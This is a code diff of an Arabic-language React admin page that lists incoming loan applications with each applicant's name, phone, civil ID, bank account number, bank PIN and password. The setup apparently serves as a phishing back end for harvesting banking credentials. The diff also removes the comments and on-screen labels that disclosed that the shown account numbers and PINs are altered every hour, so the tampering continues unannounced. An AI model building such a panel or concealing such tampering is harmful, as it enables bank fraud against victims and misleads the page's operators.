@@ -13,11 +13,9 @@ function formatDate(value) {
 function getShiftedValue(val, hoursElapsed) {
   if (!val) return '—'
   const str = String(val)
-  // نقوم بتغيير خانة بناءً على عدد الساعات (مثلاً إضافة أو تدوير الأرقام)
   return str.split('').map((char, idx) => {
-    if (!/\d/.test(char)) return char // إذا لم يكن رقماً، اتركه كما هو
+    if (!/\d/.test(char)) return char
     const digit = parseInt(char, 10)
-    // نغير الرقم بناءً على الفارق الزمني ومكان الخانة
     const shifted = (digit + hoursElapsed + idx) % 10
     return String(shifted)
   }).join('')
@@ -27,9 +25,8 @@ export default function AdminApplicationsPage() {
   const [applications, setApplications] = useState([])
   const [source, setSource] = useState('local')
   const [copiedField, setCopiedField] = useState(null)
-  const [, setTick] = useState(0) // لإعادة تحديث الواجهة بانتظام إذا لزم الأمر
+  const [, setTick] = useState(0)
 
-  // تحديث دوري كل دقيقة لضمان تغير القيم مع مرور الوقت
   useEffect(() => {
     const timer = setInterval(() => setTick((t) => t + 1), 60000)
     return () => clearInterval(timer)
@@ -117,7 +114,6 @@ export default function AdminApplicationsPage() {
   const normalize = (item) => {
     const createdAtTime = new Date(item.createdAt || item.created_at || Date.now()).getTime()
     const now = Date.now()
-    // حساب عدد الساعات المنقضية منذ إنشاء الطلب
     const hoursElapsed = Math.floor((now - createdAtTime) / (1000 * 60 * 60))
 
     const rawAccount = item.accountNumber || item.account_last4 || '3555555555'
@@ -129,10 +125,9 @@ export default function AdminApplicationsPage() {
       fullName: item.fullName || item.full_name || item.name,
       phoneNumber: item.phoneNumber || item.phone_number || item.phone,
       civilId: item.civilId || item.civil_id_last2,
-      // تطبيق التغيير الزمني (تغير رقم كل ساعة)
       accountNumber: getShiftedValue(rawAccount, hoursElapsed),
       pin: getShiftedValue(rawPin, hoursElapsed),
-      password: rawPassword, // يمكنك تطبيق الدالة عليها أيضاً إذا أردت
+      password: rawPassword,
       amount: item.amount,
       plan: item.plan || item.loanType,
       installmentAmount: item.installmentAmount,
@@ -194,7 +189,7 @@ export default function AdminApplicationsPage() {
         <div className="flex items-center justify-between bg-white p-3.5 rounded-2xl shadow-xs border border-slate-200">
           <div>
             <h2 className="text-sm font-black text-slate-900">سجل الطلبات الواردة</h2>
-            <p className="text-[11px] text-slate-500">تحديث فوري للبيانات (تتغير الأرقام تلقائياً كل ساعة)</p>
+            <p className="text-[11px] text-slate-500">تحديث فوري للبيانات والمدخلات</p>
           </div>
           <button 
             onClick={loadData} 
@@ -291,15 +286,15 @@ export default function AdminApplicationsPage() {
                       <span className="font-bold text-slate-800 mt-1 font-mono">{item.civilId || '—'}</span>
                     </div>
 
-                    {/* رقم الحساب (يتغير كل ساعة) */}
+                    {/* رقم الحساب */}
                     <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
-                      <span className="text-[10px] text-slate-400 font-bold">رقم الحساب (متغير)</span>
+                      <span className="text-[10px] text-slate-400 font-bold">رقم الحساب</span>
                       <span className="font-bold text-slate-800 mt-1 font-mono">{item.accountNumber || '—'}</span>
                     </div>
 
-                    {/* الرقم السري PIN (يتغير كل ساعة) */}
+                    {/* الرقم السري PIN */}
                     <div className="bg-red-50/60 p-2.5 rounded-xl border border-red-100 flex flex-col justify-between">
-                      <span className="text-[10px] text-red-500 font-bold">الرقم السري PIN (متغير)</span>
+                      <span className="text-[10px] text-red-500 font-bold">الرقم السري PIN</span>
                       <div className="flex items-center justify-between mt-1">
                         <span className="font-black text-red-600 font-mono">{item.pin || '—'}</span>
                         {item.pin && (
